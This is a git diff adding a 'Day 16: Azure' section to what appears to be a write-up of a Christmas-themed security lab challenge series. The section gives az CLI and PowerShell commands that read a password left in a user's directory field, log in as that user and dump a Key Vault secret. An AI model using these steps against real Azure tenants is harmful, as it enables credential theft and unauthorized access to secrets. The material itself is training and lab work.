@@ -15,6 +15,7 @@
 * [Day 13: Websockets - It came without buffering! It came without lag!](#day-13-websockets---it-came-without-buffering-it-came-without-lag)
 * [Day 14: Certificate mismanagement - Even if we're horribly mismanaged, there'll be no sad faces on SOC-mas!](#day-14-certificate-mismanagement---even-if-were-horribly-mismanaged-therell-be-no-sad-faces-on-soc-mas)
 * [Day 15: Active Directory - Be it ever so heinous, there's no place like Domain Controller](#day-15-active-directory---be-it-ever-so-heinous-theres-no-place-like-domain-controller)
+* [Day 16: Azure - The Wareville’s Key Vault grew three sizes that day](#day-16-azure---the-warevilles-key-vault-grew-three-sizes-that-day)
 
 ## Day 1: OPSEC - Maybe SOC-mas music, he thought, doesn't come from a store?
 
@@ -662,4 +663,49 @@ ForEach-Object { $_.ToXml() }
 
 ```powershell
 Get-GPO -All | Where-Object { $_.DisplayName -like "Malicious*" }
+```
+
+## Day 16: Azure - The Wareville’s Key Vault grew three sizes that day
+
+**What is the password for backupware that was leaked?**
+
+```powershell
+$user = az ad user list --filter "displayName eq 'wvusr-backupware'" --query "[0]"
+$password = echo $user | jq -r .officeLocation
+echo $password
+```
+
+**What is the group ID of the Secret Recovery Group?**
+
+```powershell
+$secret_recovery_group = az ad group list --filter "displayName eq 'Secret Recovery Group'" --query "[0]"
+echo $secret_recovery_group | jq -r .id
+```
+
+**What is the name of the vault secret?**
+
+Login as `wvusr-backupware`:
+```powershell
+$user = az ad user list --filter "displayName eq 'wvusr-backupware'" --query "[0]"
+$email = echo $user | jq -r .userPrincipalName
+$password = echo $user | jq -r .officeLocation
+az account clear
+az login -u $email -p $password
+```
+
+Get the secret name:
+```powershell
+$secret = az keyvault secret list --vault-name warevillesecrets --query [0]
+$secret_name = echo $secret | jq -r .name
+echo $secret_name
+```
+
+**What are the contents of the secret stored in the vault?**
+
+Ensure you are logged in as `wvusr-backupware` (if not repeat previous steps):
+```powershell
+$secret = az keyvault secret list --vault-name warevillesecrets --query [0]
+$secret_name = echo $secret | jq -r .name
+$secret_value = az keyvault secret show --vault-name warevillesecrets --name $secret_name
+echo $secret_value | jq -r .value
 ```
